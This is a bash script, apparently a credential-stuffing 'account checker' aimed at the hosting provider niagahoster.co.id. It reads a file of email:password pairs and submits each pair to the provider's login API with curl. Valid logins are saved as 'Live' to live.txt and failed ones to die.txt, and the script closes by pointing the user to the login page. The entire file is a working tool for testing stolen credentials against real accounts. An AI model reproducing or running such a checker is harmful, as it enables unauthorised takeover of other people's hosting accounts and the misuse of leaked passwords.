#!/bin/bash
#niagahoster.co.id Checker
#issued on : 5 Mei 2018
#coded By ./MimiUndetected
NC='\033[0m'
GREEN='\e[38;5;82m'
CYAN='\e[38;5;45m'
RED='\e[38;5;196m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'
login(){
	curl -s -X POST \
--url "https://panel.niagahoster.co.id/api/guest/client/login" \
-H "origin: https://panel.niagahoster.co.id" \
-H "referer: https://panel.niagahoster.co.id/login" \
-d "email=$1&password=$2" | grep -Po "(?<=\"message\":\").*?(?=\",)"
}
header(){
printf "${ijo}"
printf "    ___        __                _____ _____ _____   _       ________                \n"
printf "        ____  __ _           _   _    _           _      _            _           _  \n"
printf "       / /  \/  (_)         (_) | |  | |         | |    | |          | |         | | \n"
printf "      / /| \  / |_ _ __ ___  _  | |  | |_ __   __| | ___| |_ ___  ___| |_ ___  __| | \n"
printf "     / / | |\/| | | '_ ` _ \| | | |  | | '_ \ / _` |/ _ \ __/ _ \/ __| __/ _ \/ _` | \n"
printf "  _ / /  | |  | | | | | | | | | | |__| | | | | (_| |  __/ ||  __/ (__| ||  __/ (_| | \n"
printf " (_)_/   |_|  |_|_|_| |_| |_|_|  \____/|_| |_|\__,_|\___|\__\___|\___|\__\___|\__,_| \n"
printf "=========niagahoster Account Checker=================================================\n"                                                                                   
                                                                                                    
}
clear
header
echo ""
echo "=========================================================================="
echo "List In This Directory : "
ls
echo "=========================================================================="
echo "Delimeter list -> mimiundetected@outlook.com:detectedpass123 "
echo -n "Put Your List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
x=$(gawk -F: '{ print $1 }' $list)
y=$(gawk -F: '{ print $2 }' $list)
IFS=$'\r\n' GLOBIGNORE='*' command eval  'email=($x)'
IFS=$'\r\n' GLOBIGNORE='*' command eval  'password=($y)'
for (( i = 0; i < "${#email[@]}"; i++ )); do
    user="${email[$i]}"
    pws="${password[$i]}"
    ngecek=$(login "$user" "$pws")
    if [[ "$ngecek" = "Silakan periksa kembali detil login Anda" ]]; then
    	printf "[$i]${RED}[Die] => $user $pws\n${NC}"
        echo "$user | $pws" >> die.txt
    else
    	printf "[$i]${GREEN}[Live] => $user $pws${NC}\n"
    	echo "$user | $pws" >> live.txt
    fi
    grep -v "$user:$pws" $list >> $list.mimiundetected
    mv $list.mimiundetected $list
done
echo "Silakan Login => https://panel.niagahoster.co.id/login "
